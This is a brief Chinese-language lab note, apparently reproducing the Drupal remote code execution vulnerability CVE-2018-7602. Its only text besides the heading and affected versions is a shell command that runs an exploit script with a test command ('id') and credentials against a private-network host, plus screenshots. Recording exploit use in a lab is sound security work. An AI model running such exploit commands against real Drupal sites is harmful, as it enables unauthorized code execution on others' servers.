## Drupal远程代码执行(CVE-2018-7602)

### 影响范围：Drupal6.x,7.x,8.x
...
![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220411094618.png)

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220411095518.png)
...
```shell
python drupa7-CVE-2018-7602.py -c "id" hummer hummer http://10.10.10.146:8081
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220411100500.png)
